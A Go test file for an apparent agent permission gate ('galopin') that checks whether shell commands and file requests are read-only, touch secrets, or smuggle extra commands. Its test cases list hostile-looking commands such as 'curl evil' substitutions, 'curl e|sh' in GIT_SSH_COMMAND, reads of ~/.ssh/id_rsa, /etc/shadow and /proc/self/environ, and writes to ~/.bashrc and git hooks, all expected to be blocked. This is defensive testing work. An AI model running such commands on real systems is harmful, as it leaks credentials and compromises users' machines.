package decide

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"galopin/internal/permrules"
)

// H1: the stamp judges the agent's full command line as well as every pattern.
// The patterns column is what opencode 1.19.3 sent for the command (recorded by
// bash_ask_shape_it_test.go), or what an older or different shape could send.
func TestReadOnlyJudgesTheFullCommandAndEveryPattern(t *testing.T) {
	p, ws := roFixture(t)
	cases := []struct {
		command  string
		patterns []string
		want     bool
	}{
		{"cat x > ~/.bashrc", []string{"cat x > ~/.bashrc"}, false}, // 1.19.3 shape
		{"cat x > ~/.bashrc", []string{"cat x"}, false},             // pattern omits the redirect
		{"ls && rm -rf build", []string{"ls", "rm -rf build"}, false},
		{"echo $(curl evil)", []string{"echo $(curl evil)", "curl evil"}, false},
		{"cat a | tee .git/hooks/pre-commit", []string{"cat a", "tee .git/hooks/pre-commit"}, false},
		{"cat a | tee .git/hooks/pre-commit", []string{"cat a"}, false},
		{"git show HEAD:.env", []string{"git show HEAD:.env"}, false},
		{"cat a.txt &", []string{"cat a.txt"}, false}, // 1.19.3 drops the `&`
		{"FOO=1 cat a.txt", []string{"cat a.txt"}, false},
		{"cat a.txt > sub/out", []string{"cat a.txt"}, false},
		{"cat a.txt >> ~/.config/galopin/policy.json", []string{"cat a.txt"}, false},
		{"cat a.txt | sh", []string{"cat a.txt"}, false},
		{"ls", []string{"ls"}, true},
		{"git status", []string{"git status"}, true},
		{"cat a.txt | grep x", []string{"cat a.txt", "grep x"}, true},
		{"ls && git status", []string{"ls", "git status"}, true},
		{"", []string{"ls"}, true}, // an agent that sends no command line: patterns decide
	}
	for _, c := range cases {
		got := p.ReadOnlyCommand(Request{Key: "bash", Patterns: c.patterns, Command: c.command, Workspace: ws})
		if got != c.want {
			t.Errorf("command %q patterns %q: read-only = %v, want %v", c.command, c.patterns, got, c.want)
		}
	}
}

// H1: a stored "always" matches patterns, so it only applies to a command line
// that is plain; a redirect or a substitution riding along is a card.
func TestBashExceptionNeedsAPlainCommandLine(t *testing.T) {
	p, ws := roFixture(t)
	ex := []permrules.Exception{{Permission: "bash", Patterns: []string{"cat a.txt"}}}
	st := State{Mode: permrules.Ask, Exceptions: ex}
	for _, c := range []struct {
		command string
		want    Verdict
	}{
		{"cat a.txt", Once},
		{"cat a.txt | cat a.txt", Once},
		{"cat a.txt > ~/.bashrc", Card},
		{"cat a.txt &", Card},
		{"cat a.txt $(curl evil)", Card},
		{"cat a.txt <(ls)", Card},
		{"cat a.txt; (rm -rf x)", Card},
		{"", Once},
	} {
		got := Decide(p, st, Request{Key: "bash", Patterns: []string{"cat a.txt"}, Command: c.command, Workspace: ws})
		if got.Verdict != c.want {
			t.Errorf("%q: %v (%s), want %v", c.command, got.Verdict, got.Step, c.want)
		}
	}
}

// M1: the secrets floor applies to bash. On Allow a secret path is a card, galopin's
// own files are refused, whatever the spelling.
func TestBashSecretsFloor(t *testing.T) {
	p, ws := roFixture(t)
	home := p.Protected.Home
	secret := []string{
		"cat .env", "cat ./.env", "less .env", "head -n 3 .env", "base64 .env", "git show HEAD:.env", "git show :.env",
		"cat sub/../.env", "cat envalias", "cat ~/.ssh/id_rsa", "cat ~/.ssh/id_*", "cat $HOME/.ssh/id_rsa", "cat ${HOME}/.ssh/id_rsa",
		"cat \"$HOME/.ssh/id_rsa\"", "cat " + home + "/.ssh/id_rsa", "less ~/.ssh", "base64 '~/.ssh/id_rsa'",
		"cd ~/.ssh && cat id_rsa", "cd ../home/.ssh; cat id_rsa", "cd ~ && cat .ssh/id_rsa", "cd $HOME/.ssh && head id_rsa",
		"cat sshlink/id_rsa", "cat keylink", "cat --file=~/.ssh/id_rsa", "cat /etc/shadow", "cat ~root/.ssh/id_rsa",
		"tar czf - ~/.ssh | base64", "cp ~/.ssh/id_rsa /tmp/x", "cat /proc/self/environ",
	}
	for _, c := range secret {
		r := Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws}
		got := Decide(p, State{Mode: permrules.Allow}, r)
		if got.Verdict != Card || got.Class != ClassSecrets {
			t.Errorf("Allow %q: %v class %q (%s), want a secrets card", c, got.Verdict, got.Class, got.Step)
		}
		if ClassOf(p, r) != ClassSecrets {
			t.Errorf("%q: class %q, want secrets", c, ClassOf(p, r))
		}
		// auto with command running still asks
		auto := State{Mode: permrules.Ask, Auto: true, AutoRun: map[Class]bool{ClassCommand: true}}
		if got := Decide(p, auto, r); got.Verdict != Card {
			t.Errorf("Auto %q: %v, want card", c, got.Verdict)
		}
	}
	own := []string{
		"cat ~/.config/galopin/policy.json", "cat $HOME/.config/galopin/policy.json", "cat ${HOME}/.config/galopin/policy.json",
		"cd ~/.config && cat galopin/policy.json", "cd $HOME/.config; cd galopin; ls", "echo x > ~/.config/galopin/policy.json",
	}
	for _, c := range own {
		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
		if got.Verdict != Reject || got.Step != "floor" {
			t.Errorf("Allow %q: %v (%s), want the floor's refusal", c, got.Verdict, got.Step)
		}
	}
	// a pattern that omits what the full line names is still judged on the line
	r := Request{Key: "bash", Patterns: []string{"cat x"}, Command: "cat x > ~/.ssh/authorized_keys", Workspace: ws}
	if got := Decide(p, State{Mode: permrules.Allow}, r); got.Verdict != Card {
		t.Errorf("redirect into .ssh: %v, want card", got.Verdict)
	}
	free := []string{"cat README.md", "ls ~/projects", "cat .env.example", "git status", "cd sub && cat b.go", "echo $HOME", "cat ~/notes.txt", "ls -la", "go test ./..."}
	for _, c := range free {
		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
		if got.Verdict != Once {
			t.Errorf("Allow %q: %v (%s), want once", c, got.Verdict, got.Step)
		}
	}
}

// M1: on a case-insensitive filesystem the spelling's case does not matter.
func TestBashSecretsFloorFoldsCaseOnMac(t *testing.T) {
	p, ws := roFixture(t)
	p.Protected.fold = true
	for _, c := range []string{"cat ~/.SSH/id_rsa", "cat $HOME/.Ssh/ID_RSA", "cd ~/.SSH && cat id_rsa", "cat ~/.CONFIG/Galopin/policy.json"} {
		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
		if got.Verdict == Once {
			t.Errorf("%q ran on a case-folding machine", c)
		}
	}
	p.Protected.fold = false
	if got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{"cat ~/.SSH/id_rsa"}, Workspace: ws}); got.Verdict != Once {
		t.Errorf("a case-sensitive machine has no ~/.SSH: %v", got.Verdict)
	}
}

// L1: git commands that print committed secrets are not plain reads.
func TestGitCommandsThatPrintSecretsAreNotReadOnly(t *testing.T) {
	p, ws := roFixture(t)
	no := []string{"git show HEAD:.env", "git show :.env", "git show HEAD~2:config/prod.env", "git log -p", "git log --patch", "git log -p -- a.txt",
		"git log -pn 3", "git log -u", "git log --cc", "git cat-file -p HEAD:.env", "git cat-file blob HEAD:a.txt", "git diff -- .env",
		"git diff HEAD -- sshlink/id_rsa", "git show HEAD:../home/.ssh/id_rsa"}
	for _, c := range no {
		if p.ReadOnlyCommand(Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws}) {
			t.Errorf("want NOT read-only: %q", c)
		}
	}
	yes := []string{"git show HEAD:a.txt", "git show HEAD:sub/b.go", "git log --stat", "git log --oneline", "git show HEAD", "git diff", "git show HEAD:README.md"}
	for _, c := range yes {
		if !p.ReadOnlyCommand(Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws}) {
			t.Errorf("want read-only: %q", c)
		}
	}
}

// L2: a symlink inside the workspace that points outside is outside.
func TestWithinFollowsSymlinks(t *testing.T) {
	p, ws := roFixture(t)
	for _, c := range []struct {
		path string
		want Category
	}{
		{filepath.Join(ws, "outlink", "x"), Outside},
		{filepath.Join(ws, "sshlink", "id_rsa"), Outside},
		{filepath.Join(ws, "keylink"), Outside},
		{filepath.Join(ws, "inlink", "b.go"), Read},
		{filepath.Join(ws, "sub", "b.go"), Read},
		{filepath.Join(ws, "sub", "new.go"), Read},
	} {
		if cat, _ := Classify(p, Request{Key: "read", Patterns: []string{c.path}, Workspace: ws}); cat != c.want {
			t.Errorf("read %s: %v, want %v", c.path, cat, c.want)
		}
	}
	if cat, _ := Classify(p, Request{Key: "edit", Patterns: []string{filepath.Join(ws, "outlink", "y")}, Workspace: ws}); cat != Outside {
		t.Errorf("edit through an outward link: %v, want outside", cat)
	}
	// Plan no longer reads through the link.
	if got := Decide(p, State{Mode: permrules.Deny}, Request{Key: "read", Patterns: []string{filepath.Join(ws, "outlink", "x")}, Workspace: ws}); got.Verdict == Once {
		t.Errorf("plan read through an outward link: %v", got.Verdict)
	}
}

// Local MCP servers' token caches are credential stores: a read is a secrets ask,
// a write is a card too, and galopin's own mcp.json (which can hold env secrets)
// is refused, wherever it lives.
func TestMCPTokenCachesAreSecrets(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "home")
	ws := filepath.Join(root, "ws")
	mcp := filepath.Join(root, "elsewhere", "mcp.json")
	t.Setenv("APPDATA", filepath.Join(root, "AppData"))
	p := Policy{Protected: NewProtected(home, filepath.Join(home, ".local", "state", "galopin"), mcp)}
	paths := []string{
		filepath.Join(home, ".config", "ms-365-mcp-server", ".token-cache.json"),
		filepath.Join(home, ".ms-365-mcp-server", "audit.log"),
		filepath.Join(home, ".outlook-mcp", "tokens.json"),
		filepath.Join(home, "Library", "Application Support", "ms-365-mcp-server", ".token-cache.json"),
		filepath.Join(root, "AppData", "ms-365-mcp-server", ".token-cache.json"),
	}
	for _, f := range paths {
		for _, key := range []string{"read", "edit"} {
			got := Decide(p, State{Mode: permrules.Allow}, Request{Key: key, Patterns: []string{f}, Workspace: ws})
			if got.Verdict != Card || got.Class != ClassSecrets {
				t.Errorf("%s %s: %v class %q, want a secrets card", key, f, got.Verdict, got.Class)
			}
		}
	}
	for _, c := range []string{"cat ~/.config/ms-365-mcp-server/.token-cache.json", "less $HOME/.outlook-mcp/tokens.json", "cd ~/.ms-365-mcp-server && cat audit.log"} {
		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
		if got.Verdict != Card || got.Class != ClassSecrets {
			t.Errorf("%q: %v class %q, want a secrets card", c, got.Verdict, got.Class)
		}
	}
	for _, key := range []string{"read", "edit"} {
		if got := Decide(p, State{Mode: permrules.Allow}, Request{Key: key, Patterns: []string{mcp}, Workspace: ws}); got.Verdict != Reject {
			t.Errorf("%s of galopin's mcp.json: %v, want refused", key, got.Verdict)
		}
	}
}

// A long line must decide quickly (the path scan used to be quadratic in the
// number of `cd` calls) and a line too large to check is a card, not a pass.
func TestLongCommandLinesDecideFast(t *testing.T) {
	p, ws := roFixture(t)
	for _, n := range []int{200, 2000} {
		cmd := strings.Repeat("cd d; cat f; ", n)
		start := time.Now()
		r := Request{Key: "bash", Patterns: []string{cmd}, Command: cmd, Workspace: ws}
		got := Decide(p, State{Mode: permrules.Allow}, r)
		_ = ClassOf(p, r)
		_ = p.ReadOnlyCommand(r)
		_, _ = p.Protected.OwnHit(r)
		if d := time.Since(start); d > 500*time.Millisecond {
			t.Errorf("x%d took %v", n, d)
		}
		if got.Verdict != Card {
			t.Errorf("x%d: %v, want a card (too large to check)", n, got.Verdict)
		}
	}
	// many repeated reads of one file stay cheap and pass
	cmd := strings.Repeat("cat a.txt; ", 150)
	start := time.Now()
	if got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{cmd}, Command: cmd, Workspace: ws}); got.Verdict != Once {
		t.Errorf("repeated reads: %v", got.Verdict)
	}
	if d := time.Since(start); d > 500*time.Millisecond {
		t.Errorf("repeated reads took %v", d)
	}
}

func BenchmarkLongCommandLine(b *testing.B) {
	pr := NewProtected("/home/u", "/home/u/.config/galopin")
	cmd := strings.Repeat("cd d; cat f; ", 2000)
	r := Request{Key: "bash", Patterns: []string{cmd}, Command: cmd, Workspace: "/work/p"}
	for i := 0; i < b.N; i++ {
		analysisMu.Lock()
		analysisCache = map[string]cachedAnalysis{}
		analysisMu.Unlock()
		pr.SecretHit(r)
	}
}

// Words the floor cannot expand are judged conservatively.
func TestBashFloorIsConservativeOnWhatItCannotExpand(t *testing.T) {
	p, ws := roFixture(t)
	hits := []string{
		"cat ~/.s*/id_rsa", "cat ~/.[s]sh/id_rsa", "cat ~/{.ssh,x}/id_rsa", "cat ${HOME%/}/.ssh/id_rsa",
		"H=$HOME; cat $H/.ssh/id_rsa", "d=.ssh; cat ~/$d/id_rsa", "export H=$HOME && cat $H/.ssh/id_rsa", "CDPATH=~ cd .ssh && cat id_rsa",
		"CDPATH=~; cd .ssh; cat id_rsa", "cat ${UNSET}/home/.ssh/id_rsa", "cat ~/.ss?/id_rsa", "cat ~/.ssh/id_{rsa,ed25519}",
		"cat ~/*", "cat $HOME/.*",
	}
	for _, c := range hits {
		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
		if got.Verdict != Card && got.Verdict != Reject {
			t.Errorf("Allow %q ran", c)
		}
	}
	own := []string{"cat ~/.config/gal*/policy.json", "cat ~/.config/galopin/pol[i]cy.json", "cat ~/.config/{galopin,x}/policy.json", "cat ${HOME%/}/.config/galopin/policy.json"}
	for _, c := range own {
		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
		if got.Verdict != Reject {
			t.Errorf("Allow %q: %v, want the floor's refusal", c, got.Verdict)
		}
	}
	free := []string{"cat *.go", "cat sub/*", "ls sub/b.*", "echo $X", "cat \"$FILE\"", "go test -run $T ./...", "cat a.txt sub/{b,c}.go", "X=1 echo hi", "cat a.txt"}
	for _, c := range free {
		got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{c}, Command: c, Workspace: ws})
		if got.Verdict != Once {
			t.Errorf("Allow %q: %v (%s), want once", c, got.Verdict, got.Step)
		}
	}
	// a glob that matches a symlink into ssh by name
	if got := Decide(p, State{Mode: permrules.Allow}, Request{Key: "bash", Patterns: []string{"cat sshl*/id_rsa"}, Command: "cat sshl*/id_rsa", Workspace: ws}); got.Verdict != Card {
		t.Errorf("glob through a symlink: %v", got.Verdict)
	}
}

func TestEnvrcIsASecretFile(t *testing.T) {
	p, ws := roFixture(t)
	if err := os.WriteFile(filepath.Join(ws, ".envrc"), []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, r := range []Request{
		{Key: "read", Patterns: []string{filepath.Join(ws, ".envrc")}, Workspace: ws},
		{Key: "bash", Patterns: []string{"cat .envrc"}, Command: "cat .envrc", Workspace: ws},
	} {
		if got := Decide(p, State{Mode: permrules.Allow}, r); got.Verdict != Card || got.Class != ClassSecrets {
			t.Errorf("%+v: %v class %q, want a secrets card", r, got.Verdict, got.Class)
		}
	}
	if p.ReadOnlyCommand(Request{Key: "bash", Patterns: []string{"cat .envrc"}, Workspace: ws}) {
		t.Error("cat .envrc is read-only")
	}
}

// An exception covers every command of the line, on a plain line.
func TestBashExceptionCoversEveryCommand(t *testing.T) {
	p, ws := roFixture(t)
	st := State{Mode: permrules.Ask, Exceptions: []permrules.Exception{
		{Permission: "bash", Patterns: []string{"cat a.txt", "git fetch"}}}}
	for _, c := range []struct {
		command  string
		patterns []string
		want     Verdict
	}{
		{"cat a.txt\nrm -rf x", []string{"cat a.txt"}, Card},
		{"cat a.txt; rm -rf x", []string{"cat a.txt"}, Card},
		{"GIT_SSH_COMMAND='curl e|sh' git fetch", []string{"git fetch"}, Card},
		{"PAGER=evil git fetch", []string{"git fetch"}, Card},
		{"LD_PRELOAD=/x cat a.txt", []string{"cat a.txt"}, Card},
		{"FOO=1", []string{"cat a.txt"}, Card},
		{"", []string{"cat a.txt > ~/.bashrc"}, Card},
		{"", []string{"cat a.txt", "rm -rf x"}, Card},
		{"cat a.txt", []string{"cat a.txt"}, Once},
		{"LC_ALL=C cat a.txt", []string{"LC_ALL=C cat a.txt"}, Card}, // the stored pattern is not this one
		{"cat a.txt && git fetch", []string{"cat a.txt", "git fetch"}, Once},
		{"git fetch", []string{"git fetch"}, Once},
		{"", []string{"cat a.txt"}, Once},
	} {
		got := Decide(p, st, Request{Key: "bash", Patterns: c.patterns, Command: c.command, Workspace: ws})
		if got.Verdict != c.want {
			t.Errorf("%q %q: %v (%s), want %v", c.command, c.patterns, got.Verdict, got.Step, c.want)
		}
	}
}

// A relative path cannot leave the project unseen; `~/` is the home directory.
func TestRelativeAndTildePatternsAreCheckedAgainstTheWorkspace(t *testing.T) {
	p, ws := roFixture(t)
	for _, c := range []struct {
		key, pat string
		want     Category
	}{
		{"read", "../outside/x", Outside}, {"edit", "../outside/x", Outside}, {"read", "sub/../../outside/x", Outside},
		{"read", "~/notes", Outside}, {"read", "sub/b.go", Read}, {"read", "a.txt", Read}, {"edit", "sub/new.go", Edit}, {"read", "*", Read},
	} {
		if cat, _ := Classify(p, Request{Key: c.key, Patterns: []string{c.pat}, Workspace: ws}); cat != c.want {
			t.Errorf("%s %s: %v, want %v", c.key, c.pat, cat, c.want)
		}
	}
	if got := Decide(p, State{Mode: permrules.Deny}, Request{Key: "read", Patterns: []string{"../outside/x"}, Workspace: ws}); got.Verdict == Once {
		t.Error("plan read of ../x ran")
	}
}
